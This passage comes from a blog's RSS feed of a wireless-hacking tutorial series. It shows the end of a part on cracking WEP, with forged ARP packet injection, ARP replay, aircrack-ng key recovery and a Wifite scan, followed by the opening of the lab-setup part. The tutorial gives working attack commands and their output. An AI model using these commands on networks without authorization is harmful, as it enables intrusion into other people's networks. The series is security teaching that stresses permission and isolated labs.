&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo packetforge-ng -0 -a &amp;lt;BSSID&amp;gt; -h &amp;lt;fake-MAC&amp;gt; -k &amp;lt;source-IP&amp;gt; -l &amp;lt;destination-IP&amp;gt; -y &amp;lt;keystream-file&amp;gt; -w arp-request
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Using packet type: ARP Request
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Reading IVs from keystream file: keystream.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Forge a packet with the following parameters:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Source MAC address : 66:77:88:99:AA:BB
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Destination MAC : Broadcast &lt;span class="o"&gt;(&lt;/span&gt;FF:FF:FF:FF:FF:FF&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; BSSID : 00:11:22:33:44:55
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Packet &lt;span class="nb"&gt;type&lt;/span&gt; : ARP Request
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Writing forged packet to arp-request
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Forge completed successfully.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-0&lt;/code&gt; Forge ARP request packet (packet type 0)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-a&lt;/code&gt; BSSID of the target Access Point&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-h&lt;/code&gt; Fake MAC address to use as source&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-k&lt;/code&gt; Source IP address&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-l&lt;/code&gt; Destination IP address&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-y&lt;/code&gt; Keystream file generated from fragmentation attack&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-w&lt;/code&gt; Output file name to save the forged packet&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Inject the forged packet into the network:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo aireplay-ng -2 -r arp-request wlan0&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This injection causes the AP to generate new encrypted packets, increasing the number of IVs available for capture.
With traffic now stimulated, continue to collect IVs with an ARP replay attack:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo aireplay-ng --arpreplay -b &amp;lt;BSSID&amp;gt; -h &amp;lt;fake-MAC&amp;gt; wlan0&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Monitor the number of IVs captured until you have enough (usually 10,000+).
Finally, crack the WEP key using aircrack-ng:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo aircrack-ng wep_frag.cap&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;If successful, you will obtain the WEP key and gain access to the network.&lt;/p&gt;
&lt;h2 class="heading-element" id="automation-wep"&gt;&lt;span&gt;31 Automation WEP&lt;/span&gt;
 &lt;a href="#automation-wep" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;As we continue to explore wireless security in a controlled and isolated environment, we can utilize tools like Wifite2 to audit and capture network data. For example, the following command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo wifite --kill
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; . . 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; .´ · . . · &lt;span class="sb"&gt;`&lt;/span&gt;. wifite2 2.7.0
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; : : : &lt;span class="o"&gt;(&lt;/span&gt;¯&lt;span class="o"&gt;)&lt;/span&gt; : : : a wireless auditor by derv82
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="sb"&gt;`&lt;/span&gt;. · &lt;span class="sb"&gt;`&lt;/span&gt; /¯&lt;span class="se"&gt;\ &lt;/span&gt;´ · .´ maintained by kimocoder
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="sb"&gt;`&lt;/span&gt; /¯¯¯&lt;span class="se"&gt;\ &lt;/span&gt; ´ https://github.com/kimocoder/wifite2
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; option: &lt;span class="nb"&gt;kill&lt;/span&gt; conflicting processes enabled
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Using wlan0 already in monitor mode &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This command helps stop conflicting processes (like &lt;code&gt;NetworkManager&lt;/code&gt; or &lt;code&gt;wpa_supplicant&lt;/code&gt;), and sets your wireless interface to monitor mode, which is essential for packet sniffing and capturing data from nearby networks. Once in monitor mode, you can analyze various wireless networks in your environment.&lt;/p&gt;
&lt;p&gt;Here is a sample of the output you might see when running wifite:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; NUM ESSID CH ENCR PWR WPS CLIENT 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --- ------------------------- --- ----- ---- --- ------
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;1X:XX:XX:XX:XX:XX&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt; WPA 99db no 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;2X:XX:XX:XX:XX:XX&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt; WPA 99db no 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;3&lt;/span&gt; WIFI01-GUEST &lt;span class="m"&gt;8&lt;/span&gt; WPA-P 63db no 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;4&lt;/span&gt; WIFI02-GUEST &lt;span class="m"&gt;6&lt;/span&gt; WPA-P 38db lock 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;5&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;3X:XX:XX:XX:XX:XX&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;6&lt;/span&gt; WPA 38db no 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;6&lt;/span&gt; WIFI03-GUEST &lt;span class="m"&gt;6&lt;/span&gt; WPA-P 30db lock 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;7&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;4X:XX:XX:XX:XX:XX&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;6&lt;/span&gt; WPA 29db no 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;5X:XX:XX:XX:XX:XX&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt; WPA-P 21db no 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;9&lt;/span&gt; WIFI04-GUEST &lt;span class="m"&gt;1&lt;/span&gt; WPA-P 20db yes 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;10&lt;/span&gt; WIFI05-GUEST &lt;span class="m"&gt;6&lt;/span&gt; WPA-P 20db yes 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;11&lt;/span&gt; WIFI06-GUEST &lt;span class="m"&gt;11&lt;/span&gt; WPA-P 19db lock&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;In this list, each entry represents a wireless access point (AP) detected within range, with information about its ESSID (network name), channel, encryption type, signal strength (PWR), WPS status, and connected clients.&lt;/p&gt;
&lt;p&gt;This tool is essential for understanding and evaluating the security of wireless networks within a controlled and isolated environment, providing insight into nearby networks and preparing for more complex penetration testing in future parts of this series.&lt;/p&gt;
&lt;h2 class="heading-element" id="conclusion"&gt;&lt;span&gt;32 Conclusion&lt;/span&gt;
 &lt;a href="#conclusion" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;In this third part, we focused on the practical weaknesses of the WEP encryption protocol. We explored passive and active attack techniques, including packet capturing, ARP replay injection, and fragmentation attacks combined with fake authentication. These real-world examples highlighted why WEP is no longer considered secure and should be avoided whenever possible.&lt;/p&gt;
&lt;p&gt;Additionally, we introduced automation tools like &lt;strong&gt;Wifite&lt;/strong&gt; to streamline the process of auditing WEP networks, making attacks more accessible while reinforcing the importance of understanding the underlying concepts.&lt;/p&gt;
&lt;p&gt;With a solid grasp of WEP vulnerabilities and attack methods, we are now ready to move forward and tackle more modern wireless security protocols. In the next part, we will dive into WPA and WPA2, uncovering their strengths and weaknesses, and learning how to capture handshakes and perform dictionary attacks.&lt;/p&gt;</description></item><item><title>Wireless Hacking Part 2</title><link>https://Pr0xyG33k.github.io/posts/wireless02/</link><pubDate>Fri, 23 May 2025 08:50:15 +0200</pubDate><author>1024@Pr0xyG33k.github.io (ProxyGeek)</author><guid>https://Pr0xyG33k.github.io/posts/wireless02/</guid><category domain="https://Pr0xyG33k.github.io/categories/guides/">Guides</category><description>&lt;h2 class="heading-element" id="about"&gt;&lt;span&gt;19 About&lt;/span&gt;
 &lt;a href="#about" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;In Part 2 of our Wireless Hacking series, we shift our focus from theory to practice.
Having explored the fundamental concepts of wireless networks and security in the first part of this series, it&amp;rsquo;s now time to transition from theoretical knowledge to hands-on experience. While understanding the theory behind wireless attacks is essential, practical skills are just as important in mastering wireless security. However, before we begin exploring the world of wireless hacking and penetration testing, it&amp;rsquo;s critical to create a safe and controlled environment in which to learn&lt;/p&gt;
&lt;div class="alert alert-caution"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M4.47.22A.749.749.0 015 0h6c.199.0.389.079.53.22l4.25 4.25c.141.14.22.331.22.53v6a.749.749.0 01-.22.53l-4.25 4.25A.749.749.0 0111 16H5a.749.749.0 01-.53-.22L.22 11.53A.749.749.0 010 11V5c0-.199.079-.389.22-.53zm.84 1.28L1.5 5.31v5.38l3.81 3.81h5.38l3.81-3.81V5.31L10.69 1.5zM8 4a.75.75.0 01.75.75v3.5a.75.75.0 01-1.5.0v-3.5A.75.75.0 018 4zm0 8a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Caution&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Ethical Hacking Reminder&lt;/strong&gt;: Only perform wireless penetration tests on networks you own or have explicit permission to test. Unauthorized hacking is illegal and unethical.&lt;/p&gt;&lt;/div&gt;&lt;h2 class="heading-element" id="environment"&gt;&lt;span&gt;20 Environment&lt;/span&gt;
 &lt;a href="#environment" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;Before performing any wireless attacks or experiments, it&amp;rsquo;s crucial to set up a safe and isolated testing environment. Here are two solid options depending on your setup and preferences:&lt;/p&gt;
&lt;h3 class="heading-element" id="option-1-installing-kali-linux-on-a-virtual-machine"&gt;&lt;span&gt;20.1 Option 1: Installing Kali Linux on a Virtual Machine&lt;/span&gt;
 &lt;a href="#option-1-installing-kali-linux-on-a-virtual-machine" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Recommended software&lt;/strong&gt;: &lt;a href="https://www.virtualbox.org/"target="_blank" rel="external nofollow noopener noreferrer"&gt;VirtualBox&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt; or &lt;a href="https://www.vmware.com/products/workstation-player.html"target="_blank" rel="external nofollow noopener noreferrer"&gt;VMware Workstation Player&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt; (free for personal use) or &lt;a href="https://www.qemu.org/download/"target="_blank" rel="external nofollow noopener noreferrer"&gt;QEMU/KVM&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h4 class="heading-element" id="option-1-downloads-links"&gt;&lt;span&gt;20.1.1 Option 1 Downloads Links&lt;/span&gt;
 &lt;a href="#option-1-downloads-links" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.kali.org/get-kali/#kali-virtual-machines"target="_blank" rel="external nofollow noopener noreferrer"&gt;Kali Linux Virtual Machines Image&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.kali.org/get-kali/#kali-installer-images"target="_blank" rel="external nofollow noopener noreferrer"&gt;Kali Linux ISO Image&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 class="heading-element" id="option-1-installation-steps"&gt;&lt;span&gt;20.1.2 Option 1 Installation Steps&lt;/span&gt;
 &lt;a href="#option-1-installation-steps" class="heading-mark"&gt;
